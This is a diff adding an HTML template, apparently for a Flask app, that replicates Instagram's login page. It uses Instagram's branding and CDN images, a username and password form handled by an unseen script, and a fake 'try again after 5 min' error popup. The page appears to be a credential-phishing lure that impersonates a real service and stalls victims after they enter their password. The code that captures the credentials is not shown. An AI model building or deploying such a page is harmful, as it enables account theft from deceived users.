@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
+</head>
+<body>
+    <div class="main-container">
+        <!-- Phone Image Section (hidden on small screens, shown on large) -->
+        <div class="phone-app-demo"></div>
+
+        <!-- Login Section -->
+        <div class="login-section">
+            <div class="box login-box">
+                <div class="logo">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
+                </div>
+                
+                <form id="loginForm">
+                    <div class="input-group">
+                        <input type="text" id="username" placeholder="Phone number, username, or email" required>
+                    </div>
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder="Password" required>
+                    </div>
+                    
+                    <button type="submit" id="loginBtn">Log in</button>
+                </form>
+
+                <div class="divider">
+                    <div class="line"></div>
+                    <div class="or">OR</div>
+                    <div class="line"></div>
+                </div>
+
+                <div class="fb-login">
+                    <a href="#">
+                        <span class="fb-icon"></span> Log in with Facebook
+                    </a>
+                </div>
+
+                <a href="#" class="forgot-password">Forgot password?</a>
+            </div>
+
+            <div class="box signup-box">
+                <p>Don't have an account? <a href="#">Sign up</a></p>
+            </div>
+
+            <div class="get-app">
+                <p>Get the app.</p>
+                <div class="app-stores">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yt/r/Yfc020c87j0.png" alt="Get it on Google Play">
+                    <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="links">
+            <a href="#">Meta</a>
+            <a href="#">About</a>
+            <a href="#">Blog</a>
+            <a href="#">Jobs</a>
+            <a href="#">Help</a>
+            <a href="#">API</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+            <a href="#">Top Accounts</a>
+            <a href="#">Locations</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Contact Uploading & Non-Users</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="copyright">
+            <select>
+                <option value="en">English</option>
+            </select>
+            <span>© 2024 Instagram from Meta</span>
+        </div>
+    </footer>
+
+    <!-- Popup Modal -->
+    <div id="errorPopup" class="popup-overlay hidden">
+        <div class="popup-content">
+            <h3>Error</h3>
+            <p>Something went wrong. Please try again after 5 min.</p>
+            <button id="closePopup">OK</button>
+        </div>
+    </div>
+
+    <script src="{{ url_for('static', filename='script.js') }}"></script>
+</body>
+</html>
